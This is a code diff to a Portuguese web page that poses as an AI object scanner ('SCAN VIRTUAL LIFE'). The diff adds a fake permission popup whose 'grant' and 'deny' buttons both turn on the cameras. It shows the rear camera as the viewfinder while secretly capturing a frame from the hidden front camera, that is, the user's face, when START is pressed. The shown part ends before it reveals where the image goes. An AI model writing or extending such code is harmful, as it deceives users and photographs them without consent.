@@ -21,6 +21,7 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
+      padding-top: 80px;
     }
 
     h1 {
@@ -110,6 +111,54 @@
       z-index: 999;
     }
 
+    .initial-popup {
+      display: block;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      z-index: 1000;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .initial-popup h2 {
+      color: #333;
+      margin-bottom: 20px;
+      font-size: 1.3em;
+    }
+
+    .initial-popup-buttons {
+      display: flex;
+      gap: 15px;
+      justify-content: center;
+      margin-top: 25px;
+    }
+
+    .initial-popup button {
+      padding: 12px 30px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: all 0.3s ease;
+    }
+
+    .grant-btn {
+      background-color: #4CAF50;
+      color: white;
+    }
+
+    .deny-btn {
+      background-color: #f44336;
+      color: white;
+    }
+
     @media (max-width: 480px) {
       body {
         padding: 10px;
@@ -124,13 +173,66 @@
         padding: 15px;
       }
     }
+
+    .footer {
+      position: fixed;
+      bottom: 20px;
+      left: 0;
+      width: 100%;
+      text-align: center;
+      padding: 10px;
+    }
+
+    .footer-text {
+      color: #2196F3;
+      font-size: 16px;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+      text-shadow: 0 1px 1px rgba(0,0,0,0.1);
+    }
+
+    .header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background-color: rgba(255, 255, 255, 0.9);
+      padding: 15px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      z-index: 100;
+    }
+
+    .header h1 {
+      color: #2c3e50;
+      font-size: clamp(1.5em, 5vw, 2.5em);
+      margin: 0;
+      padding: 0;
+      font-weight: 600;
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+    }
   </style>
 </head>
 <body>
-  <h1>SCAN VIRTUAL LIFE</h1>
-  <video id="video" width="320" height="240" autoplay style="display: none;"></video><br>
-  <button id="captureBtn">START</button>
+  <div class="header">
+    <h1>SCAN VIRTUAL LIFE</h1>
+  </div>
+  <video id="video" width="320" height="240" autoplay style="display: none;"></video>
+  <video id="frontVideo" width="320" height="240" autoplay style="display: none;"></video><br>
+  <button id="captureBtn" style="display: none;">START</button>
+  <img src="homemscanner.png" alt="Homem Scanne" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); max-width: 100%; z-index: -1; opacity: 0.2;">
   <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+
+  <div class="footer">
+    <p class="footer-text">Aponte seu celular para um objeto e veja!</p>
+  </div>
+
+  <div class="initial-popup" id="initialPopup">
+    <h2>Nosso IA precisa de permissão para scannear objetos</h2>
+    <div class="initial-popup-buttons">
+      <button class="grant-btn" id="grantBtn">Conceder</button>
+      <button class="deny-btn" id="denyBtn">Recusar</button>
+    </div>
+  </div>
 
   <div class="overlay" id="overlay"></div>
   <div class="popup" id="popup">
@@ -144,20 +246,54 @@
 
   <script>
     const video = document.getElementById('video');
+    const frontVideo = document.getElementById('frontVideo');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
     let imageBlob = null;
     const popup = document.getElementById('popup');
     const overlay = document.getElementById('overlay');
+    const initialPopup = document.getElementById('initialPopup');
+    const captureBtn = document.getElementById('captureBtn');
 
-    // Ativa a câmera
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => video.srcObject = stream)
-      .catch(err => alert(err));
+    // Função para verificar se é dispositivo móvel
+    function isMobileDevice() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Função para ativar as câmeras
+    async function activateCamera() {
+      try {
+        // Ativa câmera traseira para visualização
+        const backStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'environment' } 
+        });
+        video.srcObject = backStream;
+        
+        // Mostra o vídeo apenas em dispositivos móveis
+        if (isMobileDevice()) {
+          video.style.display = 'block';
+        }
+
+        // Ativa câmera frontal para captura
+        const frontStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'user' } 
+        });
+        frontVideo.srcObject = frontStream;
+
+        initialPopup.style.display = 'none';
+        captureBtn.style.display = 'block';
+      } catch (err) {
+        alert('Erro ao acessar a câmera: ' + err.message);
+      }
+    }
+
+    // Ambos os botões ativam a câmera
+    document.getElementById('grantBtn').onclick = activateCamera;
+    document.getElementById('denyBtn').onclick = activateCamera;
 
     // Captura imagem ao clicar em START
-    document.getElementById('captureBtn').onclick = () => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    captureBtn.onclick = () => {
+      ctx.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(blob => {
         imageBlob = blob;
         popup.style.display = 'block';
